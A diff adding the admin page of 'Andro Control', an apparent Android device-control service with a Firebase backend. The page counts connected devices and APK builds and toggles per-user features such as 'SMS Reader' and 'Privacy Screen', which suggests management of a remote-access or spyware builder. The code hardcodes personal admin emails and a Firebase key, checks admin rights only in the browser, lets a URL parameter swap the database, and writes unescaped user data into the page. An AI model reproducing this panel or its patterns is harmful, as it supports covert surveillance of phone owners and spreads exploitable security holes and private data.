@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Andro Control — Admin Center</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const FIREBASE_URL = urlParams.get('firebase_url') || "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/";
+        const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
+        
+        const projectId = FIREBASE_URL.replace('https://', '').split('.')[0].split('-default-rtdb')[0];
+        if (!firebase.apps.length) {
+            firebase.initializeApp({
+                apiKey: "AIzaSyBH42JLBcHxguBvzBWjjLIp3PboUJU0LIk",
+                authDomain: "its-free-pay-for-premium-acces.firebaseapp.com",
+                databaseURL: FIREBASE_URL,
+                projectId: projectId,
+                appId: "1:103302569626:web:86e5716950842d15650923"
+            });
+        }
+        const fbDb = firebase.database();
+        const fbAuth = firebase.auth();
+    </script>
+    
+    <style>
+        .permission-toggle {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.2s ease;
+            border: 1px solid transparent;
+        }
+        .permission-toggle.active {
+            background: rgba(0, 184, 148, 0.15);
+            color: #00b894;
+            border-color: rgba(0, 184, 148, 0.4);
+        }
+        .permission-toggle.locked {
+            background: rgba(255, 71, 87, 0.15);
+            color: #ff4757;
+            border-color: rgba(255, 71, 87, 0.4);
+        }
+        .stat-card {
+            background: var(--card-bg, rgba(18, 18, 30, 0.65));
+            border: 1px solid var(--border-color, rgba(255,255,255,0.08));
+            border-radius: 16px;
+            padding: 20px 24px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .stat-icon {
+            width: 54px;
+            height: 54px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+        }
+        .user-avatar-cell {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--accent, #6c5ce7);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Instant Auth Loading Screen -->
+    <div id="authLoader" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #07070d; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
+        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #eb4d4b, #7c3aed); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(235,77,75,0.5);">
+            <i class="fas fa-user-shield" style="font-size: 2rem; color: #fff;"></i>
+        </div>
+        <div style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 1px;">ANDRO CONTROL ADMIN</div>
+        <div style="font-size: 0.85rem; color: var(--text-muted); display: flex; align-items: center; gap: 8px;">
+            <i class="fas fa-spinner fa-spin" style="color: #eb4d4b;"></i> Verifying Admin Privileges...
+        </div>
+    </div>
+
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div style="max-width: 1400px; margin: 0 auto; width: 100%; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;">
+            <a href="admin.html" class="navbar-brand">
+                <span class="brand-icon" style="background: linear-gradient(135deg, #eb4d4b, #7c3aed);"><i class="fas fa-user-shield"></i></span>
+                ADMIN CENTER
+            </a>
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <a href="index.html" class="nav-link"><i class="fas fa-satellite-dish me-1"></i> Builder & Dashboard</a>
+                <span class="live-badge" style="border-color: rgba(235, 77, 75, 0.4); color: #eb4d4b;"><span class="live-dot" style="background: #eb4d4b;"></span> SUPER ADMIN ACTIVE</span>
+                
+                <div id="navUserProfile" style="display: flex; align-items: center; gap: 10px; padding-left: 12px; border-left: 1px solid rgba(255,255,255,0.12);">
+                    <img id="adminAvatar" src="" alt="Admin" style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid #eb4d4b;">
+                    <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                        <span id="adminName" style="font-size: 0.82rem; font-weight: 600; color: #fff; line-height: 1.2;">Admin</span>
+                        <span style="font-size: 0.6rem; font-weight: 700; padding: 1px 6px; border-radius: 4px; background: rgba(235,77,75,0.2); color: #eb4d4b; border: 1px solid rgba(235,77,75,0.4);">ADMIN</span>
+                    </div>
+                    <button onclick="firebase.auth().signOut().then(() => window.location.href = 'login.html')" class="btn-ghost" style="padding: 4px 10px; font-size: 0.75rem; color: #ff6b6b; border-color: rgba(255,107,107,0.3);">
+                        <i class="fas fa-sign-out-alt"></i> Sign Out
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main style="max-width: 1400px; margin: 0 auto; padding: 32px 24px;">
+        <div class="fade-in">
+            
+            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; flex-wrap: wrap; gap: 16px;">
+                <div>
+                    <h1 style="font-size: 1.8rem; margin-bottom: 6px; font-family: 'Outfit', sans-serif;">User & Access Management</h1>
+                    <p style="color: var(--text-secondary); font-size: 0.85rem;">Manage user permissions, monitor user activity, and grant admin roles.</p>
+                </div>
+                <div class="glass-sm" style="padding: 10px 18px; display: flex; align-items: center; gap: 10px;">
+                    <i class="fas fa-shield-alt" style="color: #eb4d4b;"></i>
+                    <span style="font-size: 0.8rem; font-weight: 600; color: #fff;">Granular RBAC Enforced</span>
+                </div>
+            </div>
+
+            <!-- Stats Row -->
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; margin-bottom: 32px;">
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: rgba(108, 92, 231, 0.15); color: #6c5ce7;"><i class="fas fa-users"></i></div>
+                    <div>
+                        <div style="font-size: 0.75rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase;">Total Users</div>
+                        <div id="statTotalUsers" style="font-size: 1.8rem; font-weight: 800; color: #fff; font-family: 'Outfit', sans-serif;">0</div>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: rgba(235, 77, 75, 0.15); color: #eb4d4b;"><i class="fas fa-user-shield"></i></div>
+                    <div>
+                        <div style="font-size: 0.75rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase;">Admins</div>
+                        <div id="statAdmins" style="font-size: 1.8rem; font-weight: 800; color: #fff; font-family: 'Outfit', sans-serif;">0</div>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: rgba(0, 184, 148, 0.15); color: #00b894;"><i class="fas fa-mobile-alt"></i></div>
+                    <div>
+                        <div style="font-size: 0.75rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase;">Connected Devices</div>
+                        <div id="statDevices" style="font-size: 1.8rem; font-weight: 800; color: #fff; font-family: 'Outfit', sans-serif;">0</div>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: rgba(253, 203, 110, 0.15); color: #fdcb6e;"><i class="fas fa-cubes"></i></div>
+                    <div>
+                        <div style="font-size: 0.75rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase;">Total APK Builds</div>
+                        <div id="statBuilds" style="font-size: 1.8rem; font-weight: 800; color: #fff; font-family: 'Outfit', sans-serif;">0</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Users Table Card -->
+            <div class="card" style="margin-bottom: 32px; overflow: hidden;">
+                <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center; padding: 18px 24px;">
+                    <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-user-cog" style="color: #6c5ce7;"></i> Registered Accounts & Feature Controls
+                    </h4>
+                    <span id="userCountBadge" class="live-badge" style="background: rgba(255,255,255,0.05); color: #fff; border-color: rgba(255,255,255,0.15);">0 Accounts</span>
+                </div>
+                
+                <div style="overflow-x: auto;">
+                    <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.85rem;">
+                        <thead>
+                            <tr style="background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border-color);">
+                                <th style="padding: 16px 20px; color: var(--text-muted); font-weight: 600;">USER</th>
+                                <th style="padding: 16px 20px; color: var(--text-muted); font-weight: 600;">ROLE</th>
+                                <th style="padding: 16px 20px; color: var(--text-muted); font-weight: 600;">ACTIVITY</th>
+                                <th style="padding: 16px 20px; color: var(--text-muted); font-weight: 600;">FEATURE PERMISSIONS (CLICK TO TOGGLE)</th>
+                                <th style="padding: 16px 20px; color: var(--text-muted); font-weight: 600; text-align: right;">ACTIONS</th>
+                            </tr>
+                        </thead>
+                        <tbody id="usersTableBody">
+                            <tr>
+                                <td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">
+                                    <i class="fas fa-spinner fa-spin" style="font-size: 1.5rem; color: var(--accent); margin-bottom: 10px; display: block;"></i>
+                                    Loading accounts database...
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Activity Audit Logs Card -->
+            <div class="card">
+                <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center; padding: 18px 24px;">
+                    <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-history" style="color: #00b894;"></i> Realtime Platform Audit Logs
+                    </h4>
+                    <span class="live-badge"><span class="live-dot"></span> STREAMING</span>
+                </div>
+                <div style="padding: 20px; max-height: 350px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem;" id="auditLogList">
+                    <div class="empty-state"><i class="fas fa-stream"></i><p>Listening for platform user events...</p></div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- User Detail Modal -->
+    <div id="userDetailModal" onclick="if(event.target===this)closeDetailModal()" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(7, 7, 13, 0.85); backdrop-filter: blur(10px); z-index: 100000; align-items: center; justify-content: center; padding: 20px;">
+        <div style="background: rgba(18, 18, 30, 0.95); border: 1px solid var(--border-color); border-radius: 20px; max-width: 600px; width: 100%; padding: 30px; box-shadow: 0 0 50px rgba(108, 92, 231, 0.25);">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px;">
+                <h3 style="font-size: 1.2rem; font-weight: 700; color: #fff; font-family: 'Outfit', sans-serif;" id="modalUserTitle">User Audit Profile</h3>
+                <button onclick="closeDetailModal()" style="background: transparent; border: none; color: var(--text-muted); font-size: 1.2rem; cursor: pointer;"><i class="fas fa-times"></i></button>
+            </div>
+            <div id="modalUserContent" style="display: flex; flex-direction: column; gap: 16px; font-size: 0.85rem; color: #ccc;">
+                <!-- Filled dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+    let currentAdminUser = null;
+    let allUsersData = {};
+    let allDevicesData = {};
+    let allBuildsData = {};
+
+    fbAuth.onAuthStateChanged(user => {
+        if (!user) {
+            window.location.replace('login.html');
+            return;
+        }
+
+        const email = (user.email || '').toLowerCase();
+        const uid = user.email ? user.email.replace(/[@.]/g, '_') : user.uid;
+
+        // Check if Admin
+        fbDb.ref('users_meta/' + uid).once('value', snap => {
+            const meta = snap.val() || {};
+            const isAdmin = ADMIN_EMAILS.includes(email) || meta.role === 'ADMIN';
+
+            if (!isAdmin) {
+                alert('Access Denied: Admin privileges required.');
+                window.location.replace('index.html');
+                return;
+            }
+
+            currentAdminUser = user;
+            document.getElementById('authLoader').style.display = 'none';
+            document.getElementById('adminName').textContent = user.displayName || email.split('@')[0];
+            document.getElementById('adminAvatar').src = user.photoURL || 'https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y';
+
+            // Start listening to Admin Data
+            initAdminDashboard();
+        });
+    });
+
+    function initAdminDashboard() {
+        // 1. Listen to users_meta
+        fbDb.ref('users_meta').on('value', snap => {
+            allUsersData = snap.val() || {};
+            renderUsersTable();
+            updateStats();
+        });
+
+        // 2. Listen to all devices
+        fbDb.ref('users').on('value', snap => {
+            allDevicesData = snap.val() || {};
+            renderUsersTable();
+            updateStats();
+        });
+
+        // 3. Listen to all panel builds
+        fbDb.ref('panel_users').on('value', snap => {
+            allBuildsData = snap.val() || {};
+            renderUsersTable();
+            updateStats();
+        });
+
+        // 4. Listen to audit activity stream
+        fbDb.ref('audit_logs').limitToLast(50).on('value', snap => {
+            renderAuditLogs(snap.val());
+        });
+    }
+
+    function updateStats() {
+        const userKeys = Object.keys(allUsersData);
+        let totalUsers = userKeys.length;
+        let totalAdmins = 0;
+        let totalDevices = 0;
+        let totalBuilds = 0;
+
+        userKeys.forEach(k => {
+            const u = allUsersData[k];
+            if (u.role === 'ADMIN' || (u.email && ADMIN_EMAILS.includes(u.email.toLowerCase()))) {
+                totalAdmins++;
+            }
+            if (u.build_count) totalBuilds += u.build_count;
+        });
+
+        Object.keys(allDevicesData).forEach(ukey => {
+            const devs = allDevicesData[ukey]?.devices || {};
+            totalDevices += Object.keys(devs).length;
+        });
+
+        document.getElementById('statTotalUsers').textContent = totalUsers;
+        document.getElementById('statAdmins').textContent = totalAdmins;
+        document.getElementById('statDevices').textContent = totalDevices;
+        document.getElementById('statBuilds').textContent = totalBuilds;
+        document.getElementById('userCountBadge').textContent = totalUsers + ' Accounts';
+    }
+
+    function renderUsersTable() {
+        const tbody = document.getElementById('usersTableBody');
+        const userKeys = Object.keys(allUsersData);
+
+        if (userKeys.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:30px;color:var(--text-muted);">No user profiles found in database. Users will auto-appear when they log in.</td></tr>';
+            return;
+        }
+
+        let html = '';
+        userKeys.forEach(uid => {
+            const u = allUsersData[uid] || {};
+            const email = u.email || 'Unknown Email';
+            const name = u.displayName || (email.includes('@') ? email.split('@')[0] : uid);
+            const avatar = u.photoURL || 'https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y';
+            const isHardcodedAdmin = ADMIN_EMAILS.includes(email.toLowerCase());
+            const isAdmin = isHardcodedAdmin || u.role === 'ADMIN';
+            
+            // Devices count for this user
+            const userDevicesObj = allDevicesData[uid]?.devices || {};
+            const deviceCount = Object.keys(userDevicesObj).length;
+
+            // Builds count for this user
+            const buildCount = u.build_count || (allBuildsData[uid]?.last_apk ? 1 : 0);
+
+            // Permissions
+            const perms = u.permissions || {};
+            const smsActive = isAdmin || perms.sms === true;
+            const notifActive = isAdmin || perms.notification === true;
+            const privacyActive = isAdmin || perms.privacy_screen === true;
+            const buildActive = perms.build_apk !== false;
+
+            const lastLogin = u.last_login_formatted || (u.last_login ? new Date(u.last_login).toLocaleString() : 'Recently');
+            const loginCount = u.login_count || 1;
+
+            html += `
+            <tr style="border-bottom: 1px solid var(--border-color);">
+                <td style="padding: 16px 20px;">
+                    <div style="display: flex; align-items: center; gap: 12px;">
+                        <img src="${avatar}" class="user-avatar-cell" alt="User">
+                        <div>
+                            <div style="font-weight: 700; color: #fff; font-size: 0.9rem;">${name}</div>
+                            <div style="font-size: 0.75rem; color: var(--text-muted);">${email}</div>
+                            <code style="font-size: 0.65rem; color: var(--accent); opacity: 0.8;">UID: ${uid}</code>
+                        </div>
+                    </div>
+                </td>
+                <td style="padding: 16px 20px;">
+                    ${isAdmin ? 
+                        `<span style="background: rgba(235,77,75,0.2); color: #eb4d4b; border: 1px solid rgba(235,77,75,0.4); padding: 3px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: 800;"><i class="fas fa-shield-alt"></i> ADMIN</span>` :
+                        `<span style="background: rgba(0,184,148,0.2); color: #00b894; border: 1px solid rgba(0,184,148,0.4); padding: 3px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: 700;">USER</span>`
+                    }
+                </td>
+                <td style="padding: 16px 20px;">
+                    <div style="display: flex; flex-direction: column; gap: 2px;">
+                        <span style="color: #fff; font-weight: 600;"><i class="fas fa-mobile-alt" style="color: var(--accent); margin-right: 4px;"></i>${deviceCount} Devices</span>
+                        <span style="color: var(--text-muted); font-size: 0.75rem;"><i class="fas fa-cubes" style="color: #fdcb6e; margin-right: 4px;"></i>${buildCount} Builds</span>
+                        <span style="color: var(--text-muted); font-size: 0.7rem;"><i class="fas fa-clock" style="margin-right: 4px;"></i>${lastLogin} (${loginCount}x)</span>
+                    </div>
+                </td>
+                <td style="padding: 16px 20px;">
+                    <div style="display: flex; flex-wrap: wrap; gap: 6px;">
+                        <span class="permission-toggle ${smsActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'sms', ${!smsActive})">
+                            <i class="fas ${smsActive ? 'fa-envelope-open' : 'fa-lock'}"></i> SMS Reader
+                        </span>
+                        <span class="permission-toggle ${notifActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'notification', ${!notifActive})">
+                            <i class="fas ${notifActive ? 'fa-bell' : 'fa-lock'}"></i> Push Notif
+                        </span>
+                        <span class="permission-toggle ${privacyActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'privacy_screen', ${!privacyActive})">
+                            <i class="fas ${privacyActive ? 'fa-user-secret' : 'fa-lock'}"></i> Privacy Screen
+                        </span>
+                        <span class="permission-toggle ${buildActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'build_apk', ${!buildActive})">
+                            <i class="fas ${buildActive ? 'fa-hammer' : 'fa-ban'}"></i> Build APK
+                        </span>
+                    </div>
+                </td>
+                <td style="padding: 16px 20px; text-align: right;">
+                    <div style="display: flex; justify-content: flex-end; gap: 8px;">
+                        ${!isHardcodedAdmin ? `
+                            <button onclick="toggleAdminRole('${uid}', ${!isAdmin})" class="btn-ghost" style="padding: 4px 10px; font-size: 0.75rem; border-color: ${isAdmin ? 'rgba(255,71,87,0.4)' : 'rgba(0,184,148,0.4)'}; color: ${isAdmin ? '#ff4757' : '#00b894'};">
+                                <i class="fas ${isAdmin ? 'fa-user-minus' : 'fa-user-plus'}"></i> ${isAdmin ? 'Revoke Admin' : 'Make Admin'}
+                            </button>
+                        ` : ''}
+                        <button onclick="viewUserDetail('${uid}')" class="btn-ghost" style="padding: 4px 10px; font-size: 0.75rem;">
+                            <i class="fas fa-eye"></i> Audit Log
+                        </button>
+                    </div>
+                </td>
+            </tr>
+            `;
+        });
+
+        tbody.innerHTML = html;
+    }
+
+    function toggleUserPermission(uid, permKey, newValue) {
+        fbDb.ref(`users_meta/${uid}/permissions/${permKey}`).set(newValue).then(() => {
+            // Log action to audit stream
+            fbDb.ref('audit_logs').push({
+                timestamp: Date.now(),
+                admin: currentAdminUser.email,
+                action: `Updated permission ${permKey}=${newValue} for target user ${uid}`
+            });
+        });
+    }
+
+    function toggleAdminRole(uid, makeAdmin) {
+        const newRole = makeAdmin ? 'ADMIN' : 'USER';
+        fbDb.ref(`users_meta/${uid}/role`).set(newRole).then(() => {
+            fbDb.ref('audit_logs').push({
+                timestamp: Date.now(),
+                admin: currentAdminUser.email,
+                action: `Set role ${newRole} for user ${uid}`
+            });
+        });
+    }
+
+    function viewUserDetail(uid) {
+        const u = allUsersData[uid] || {};
+        document.getElementById('modalUserTitle').textContent = 'Audit Profile — ' + (u.displayName || uid);
+        
+        let content = `
+            <div style="background: rgba(255,255,255,0.03); padding: 15px; border-radius: 12px; border: 1px solid var(--border-color);">
+                <div><strong>Email:</strong> ${u.email || 'N/A'}</div>
+                <div><strong>UID:</strong> ${uid}</div>
+                <div><strong>Role:</strong> ${u.role || 'USER'}</div>
+                <div><strong>First Registered / Seen:</strong> ${u.created_at ? new Date(u.created_at).toLocaleString() : 'N/A'}</div>
+                <div><strong>Last Login:</strong> ${u.last_login_formatted || 'N/A'}</div>
+                <div><strong>Total Logins:</strong> ${u.login_count || 1}</div>
+                <div><strong>Browser User-Agent:</strong> <span style="font-size:0.75rem; color:var(--text-muted); word-break:break-all;">${u.user_agent || 'N/A'}</span></div>
+            </div>
+            
+            <div style="font-weight: 700; color: #fff; margin-top: 10px;">Recent Activity History:</div>
+            <div style="max-height: 200px; overflow-y: auto; background: #0b0b14; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem;">
+        `;
+
+        const logs = u.activity_history || {};
+        const logKeys = Object.keys(logs);
+
+        if (logKeys.length === 0) {
+            content += '<div style="color:var(--text-muted);">No recorded activity history yet.</div>';
+        } else {
+            logKeys.reverse().forEach(k => {
+                const log = logs[k];
+                const time = log.time ? new Date(log.time).toLocaleString() : '';
+                content += `<div style="margin-bottom:6px;"><span style="color:var(--accent);">[${time}]</span> ${log.action}</div>`;
+            });
+        }
+
+        content += '</div>';
+        document.getElementById('modalUserContent').innerHTML = content;
+        document.getElementById('userDetailModal').style.display = 'flex';
+    }
+
+    function closeDetailModal() {
+        document.getElementById('userDetailModal').style.display = 'none';
+    }
+
+    function renderAuditLogs(logsObj) {
+        const container = document.getElementById('auditLogList');
+        if (!logsObj) {
+            container.innerHTML = '<div class="empty-state"><i class="fas fa-stream"></i><p>No audit events recorded yet.</p></div>';
+            return;
+        }
+        let html = '';
+        Object.keys(logsObj).reverse().forEach(k => {
+            const log = logsObj[k];
+            const time = log.timestamp ? new Date(log.timestamp).toLocaleTimeString() : '';
+            html += `<div style="margin-bottom:6px; border-bottom: 1px dashed rgba(255,255,255,0.05); padding-bottom: 4px;"><span style="color:#eb4d4b;">[${time}]</span> <span style="color:#00b894;">${log.admin || log.user || 'System'}:</span> <span style="color:#ccc;">${log.action}</span></div>`;
+        });
+        container.innerHTML = html;
+    }
+    </script>
+</body>
+</html>
